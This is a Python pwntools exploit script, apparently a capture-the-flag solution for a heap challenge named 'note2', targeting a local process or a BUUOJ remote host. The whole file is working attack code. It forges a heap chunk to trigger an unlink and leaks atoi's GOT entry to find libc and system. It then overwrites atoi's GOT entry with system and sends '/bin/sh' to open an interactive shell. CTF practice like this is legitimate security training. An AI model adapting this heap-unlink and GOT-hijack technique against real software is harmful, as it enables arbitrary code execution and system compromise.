# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'note2'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

islocal = 1
if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 25077)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))


def login():
    p.recvuntil("name:\n")
    p.sendline("klose")
    p.recvuntil("address:\n")
    p.sendline("none")

def add(size, content):
    p.recvuntil(">>\n")
    p.sendline("1")
    p.recvuntil("128)\n")
    p.sendline(str(size))
    p.recvuntil("content:\n")
    p.sendline(content)

def show(index):
    p.recvuntil(">>\n")
    p.sendline("2")
    p.recvuntil("note:\n")
    p.sendline(str(index))

def edit(index, choice, content):
    p.recvuntil(">>\n")
    p.sendline("3")
    p.recvuntil("note:\n")
    p.sendline(str(index))
    p.recvuntil("append]\n")
    p.sendline(str(choice))
    p.recvuntil("TheNewContents:")
    p.sendline(content)

def delete(index):
    p.recvuntil(">>\n")
    p.sendline("4")
    p.recvuntil("note:\n")
    p.sendline(str(index))


def unlink():
    ptr_addr = 0x602120
    fake_fd = ptr_addr - 0x18
    fake_bk = ptr_addr - 0x10

    # login()

    payload1  = b'a' * 8
    payload1 += p64(0x61)
    payload1 += p64(fake_fd)
    payload1 += p64(fake_bk)
    payload1 += b'b' * 0x40
    payload1 += p64(0x60)

    add(0x80, payload1)         # chunk0 size = 0x91
    # debug(0)
    add(0, b'')            # 0-size chunk1, size = 0x21
    # debug(0)
    add(0x80, b'c' * 8)
    # debug(0)
    delete(1)              # free chunk1
    # debug(0)
    add(0, b'd' * 16 + p64(0xa0) + p64(0x90))   # malloc chunk1 to change chunk2's prev_size & size
    debug(0)
    delete(2)           # trigger unlink
    # debug(0)

def leak():
    global system_addr
    payload2 = b'e' * 0x18 + p64(elf.got['atoi'])
    edit(0, 1, payload2)

    log.info("leak libc_base")
    show(0)
    p.recvuntil('is ')
    atoi_addr = u64(p.recvuntil("\n")[0:6].ljust(8, b"\x00"))
    log.success('atoi_addr => ' + hex(atoi_addr))
    # libc_base = atoi_addr - 0x36e80
    libc_base = atoi_addr - libc.sym['atoi']
    log.success('libc_base => ' + hex(libc_base))
    # system_addr = libc_base + 0x45390
    system_addr = libc_base + libc.sym['system']
    log.success('system_addr => ' + hex(system_addr))

def pwn():
    log.info("hijack atoi_got to system")
    edit(0, 1, p64(system_addr))
    p.recvuntil(">>\n")
    p.sendline("/bin/sh\0")
    p.interactive()

if __name__ == '__main__':
    unlink()
    leak()  
    pwn()